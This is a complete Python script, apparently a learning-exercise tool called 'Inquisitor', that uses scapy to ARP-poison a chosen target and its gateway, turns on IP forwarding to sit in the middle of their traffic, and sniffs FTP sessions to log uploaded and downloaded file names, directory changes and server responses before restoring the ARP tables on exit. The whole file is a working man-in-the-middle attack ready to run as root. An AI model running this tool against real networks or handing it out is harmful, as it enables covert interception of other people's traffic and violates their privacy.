#!/usr/bin/env python3
import sys
import os
import signal
import argparse
import socket
import ipaddress
import re
from time import sleep
from scapy.all import *

# Store original ARP tables for restoration
original_arp = {}
running = True

def validate_ip(ip):
    """Validate that the given string is a valid IPv4 address."""
    try:
        ipaddress.IPv4Address(ip)
        return True
    except ipaddress.AddressValueError:
        return False

def get_mac(ip):
    """Get MAC address for an IP using ARP."""
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0)
        if ans:
            return ans[0][1].hwsrc
        return None
    except Exception as e:
        print(f"Error getting MAC for {ip}: {e}")
        return None

def restore_arp(target_ip, target_mac, gateway_ip, gateway_mac):
    """Restore ARP tables to their original state."""
    print("\n[*] Restoring ARP tables...")
    try:
        # Tell target that gateway is at gateway_mac
        send(ARP(op=2, pdst=target_ip, hwdst=target_mac, 
                psrc=gateway_ip, hwsrc=gateway_mac), count=5, verbose=0)
        
        # Tell gateway that target is at target_mac
        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, 
                psrc=target_ip, hwsrc=target_mac), count=5, verbose=0)
        
        print("[+] ARP tables restored.")
    except Exception as e:
        print(f"[!] Error restoring ARP tables: {e}")

def poison_arp(target_ip, target_mac, gateway_ip, gateway_mac):
    """Perform ARP poisoning attack."""
    attacker_mac = get_if_hwaddr(conf.iface)
    
    try:
        # Tell target that gateway is at our MAC
        send(ARP(op=2, pdst=target_ip, hwdst=target_mac, 
                psrc=gateway_ip, hwsrc=attacker_mac), verbose=0)
        
        # Tell gateway that target is at our MAC
        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, 
                psrc=target_ip, hwsrc=attacker_mac), verbose=0)
    except Exception as e:
        print(f"[!] Error during ARP poisoning: {e}")

def process_ftp_packet(packet):
    """Extract FTP commands and information from packets."""
    try:
        if packet.haslayer(Raw):
            payload = packet[Raw].load.decode('utf-8', errors='ignore')
            
            # Look for FTP commands related to file transfers
            # File upload (STOR)
            stor_match = re.search(r"STOR\s+(\S+)", payload)
            if stor_match:
                filename = stor_match.group(1)
                print(f"\n[+] File Upload Detected: {filename}")
                return
            
            # File download (RETR)
            retr_match = re.search(r"RETR\s+(\S+)", payload)
            if retr_match:
                filename = retr_match.group(1)
                print(f"\n[+] File Download Detected: {filename}")
                return
            
            # Directory listing
            if "LIST" in payload:
                print(f"\n[*] FTP Command: Directory listing requested")
                return
                
            # Change directory
            cwd_match = re.search(r"CWD\s+(\S+)", payload)
            if cwd_match:
                directory = cwd_match.group(1)
                print(f"\n[*] FTP Command: Changed directory to {directory}")
                return
                
            # FTP responses
            response_match = re.search(r"^(\d{3})[\s-](.+)$", payload)
            if response_match:
                code = response_match.group(1)
                if code.startswith('1') or code.startswith('2'):
                    print(f"\n[*] FTP Success: {payload.strip()}")
                elif code.startswith('4') or code.startswith('5'):
                    print(f"\n[*] FTP Error: {payload.strip()}")
                return
    except Exception as e:
        # Just ignore any errors in packet processing
        pass

def packet_callback(packet):
    """Callback function for packet processing."""
    # Process only TCP packets to/from FTP ports (20, 21)
    if packet.haslayer(TCP):
        # FTP command channel (port 21)
        if packet[TCP].dport == 21 or packet[TCP].sport == 21:
            process_ftp_packet(packet)
        # FTP data channel (port 20)
        elif packet[TCP].dport == 20 or packet[TCP].sport == 20:
            # For data channel we might want to analyze actual transferred data
            pass

def signal_handler(sig, frame):
    """Handle Ctrl+C and ensure clean exit."""
    global running
    print("\n[!] Received interrupt, stopping...")
    running = False

def enable_ip_forwarding():
    """Enable IP forwarding on the system."""
    try:
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        return True
    except Exception as e:
        print(f"[!] Error enabling IP forwarding: {e}")
        return False

def disable_ip_forwarding():
    """Disable IP forwarding on the system."""
    try:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    except Exception:
        pass

def main():
    parser = argparse.ArgumentParser(description='Inquisitor - ARP Spoofing and FTP Monitoring Tool')
    parser.add_argument('target_ip', help='Target IP address')
    parser.add_argument('gateway_ip', help='Gateway IP address')
    parser.add_argument('-i', '--interface', default=conf.iface, help='Network interface to use')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    
    args = parser.parse_args()
    
    # Validate IP addresses
    if not validate_ip(args.target_ip):
        print(f"[!] Invalid target IP address: {args.target_ip}")
        return 1
    if not validate_ip(args.gateway_ip):
        print(f"[!] Invalid gateway IP address: {args.gateway_ip}")
        return 1
    
    # Set network interface
    conf.iface = args.interface
    
    # Get MAC addresses
    print(f"[*] Getting MAC addresses...")
    gateway_mac = get_mac(args.gateway_ip)
    if not gateway_mac:
        print(f"[!] Failed to get gateway MAC address for {args.gateway_ip}")
        return 1
        
    target_mac = get_mac(args.target_ip)
    if not target_mac:
        print(f"[!] Failed to get target MAC address for {args.target_ip}")
        return 1
    
    print(f"[*] Gateway: {args.gateway_ip} ({gateway_mac})")
    print(f"[*] Target: {args.target_ip} ({target_mac})")
    
    # Store original ARP info for restoration
    global original_arp
    original_arp = {
        'target_ip': args.target_ip,
        'target_mac': target_mac,
        'gateway_ip': args.gateway_ip,
        'gateway_mac': gateway_mac
    }
    
    # Set up signal handler for clean exit
    signal.signal(signal.SIGINT, signal_handler)
    
    # Enable IP forwarding
    print("[*] Enabling IP forwarding...")
    if not enable_ip_forwarding():
        return 1
    
    global running
    
    try:
        print("[*] Starting ARP poisoning attack...")
        print("[*] Press Ctrl+C to stop and restore ARP tables")
        
        # Start sniffing in a separate thread
        t = AsyncSniffer(filter="tcp port 21 or tcp port 20", prn=packet_callback, store=0)
        t.start()
        
        while running:
            # Perform ARP poisoning
            poison_arp(args.target_ip, target_mac, args.gateway_ip, gateway_mac)
            sleep(2)  # Resend ARP packets every 2 seconds
            
    except Exception as e:
        print(f"[!] An error occurred: {e}")
        running = False
    finally:
        # Stop sniffing
        try:
            t.stop()
        except Exception:
            pass
            
        # Restore ARP tables
        restore_arp(args.target_ip, target_mac, args.gateway_ip, gateway_mac)
        
        # Disable IP forwarding
        disable_ip_forwarding()
        
        print("[*] Exit complete.")
    
    return 0

if __name__ == "__main__":
    # Check if running as root (required for raw sockets)
    if os.geteuid() != 0:
        print("[!] This script must be run as root!")
        sys.exit(1)
    
    sys.exit(main())